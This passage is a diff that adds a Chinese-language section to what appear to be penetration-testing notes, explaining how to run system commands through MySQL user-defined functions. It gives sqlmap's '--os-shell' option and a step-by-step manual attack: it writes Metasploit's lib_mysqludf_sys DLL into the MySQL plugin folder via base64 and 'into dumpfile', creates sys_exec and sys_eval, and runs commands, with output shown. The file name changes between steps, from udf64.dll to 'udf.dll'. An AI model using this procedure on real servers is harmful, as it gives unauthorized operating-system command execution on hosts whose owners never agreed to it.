@@ -325,6 +325,92 @@ mysql
 performance_schema
 ```
 
+### 利用MySQL数据库的UDF函数执行系统命令
+
+* 前提条件
+  * MySQL具备文件读取、写入权限
+  * 知道MySQL的plugin文件夹的具体位置
+* 原理
+  * MySQL的UDF函数 - 上传一个二进制文件:共享库(shared library)到对应文件夹，它包含两个用户自定义函数(user-defined functions,UDF)用户自定义函数,其中有2个函数的作用是执行系统命令. 然后在数据库使用SQL语句 创建该函数 并调用该函数 即可执行系统命令
+
+
+自动过程:
+```
+--os-shell
+```
+
+手工过程:
+```
+第1步 - 准备UDF文件
+metasploit中有windows下MySQL的UDF二进制文件:
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
+/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
+
+----
+
+第2步 - 传输UDF文件到目标主机的目标文件夹
+
+可以用hex编码、base64编码.
+
+MySQL实现base64编码解码 MySQL版本要求:
+MySQL >= 5.6.1
+MariaDB >= 10.0.5 
+
+编码
+select to_base64(load_file('D:\\lib_mysqludf_sys_64.dll')) into outfile "D:\\udf64.txt" 
+
+解码
+select from_base64("base64的内容") into dumpfile "D:\mysql-5.6.41-winx64\lib\plugin\udf64.dll";
+
+----
+
+第3步 - 创建函数
+
+创建2个函数:
+sys_exec 该函数无法回显结果
+sys_eval 可回显执行结果
+create function sys_exec RETURNS int soname 'udf.dll'
+create function sys_eval returns string soname 'udf.dll';
+
+看下函数是否成功创建
+mysql> select * from mysql.func where name = "sys_exec";
++----------+-----+---------+----------+
+| name     | ret | dl      | type     |
++----------+-----+---------+----------+
+| sys_exec |   2 | udf.dll | function |
++----------+-----+---------+----------+
+1 row in set (0.00 sec)
+
+----
+
+第4步 - 执行函数
+
+执行sys_eval函数 该函数可回显执行结果
+mysql> select sys_eval('whoami');
++------------------------+
+| sys_eval('whoami')     |
++------------------------+
+| desktop-s2l4c24\k0rz3n |
++------------------------+
+1 row in set (0.27 sec)
+
+执行sys_exec函数 该函数无法回显结果,会在目标主机桌面上弹出黑框并立即退出
+mysql> select sys_exec('whoami');
++--------------------+
+| sys_exec('whoami') |
++--------------------+
+|                  0 |
++--------------------+
+1 row in set (0.28 sec)
+
+----
+
+第5步 - 删除2个函数
+
+drop function sys_exec;
+drop function sys_eval;
+```
+
 ### Usage
 
 ```
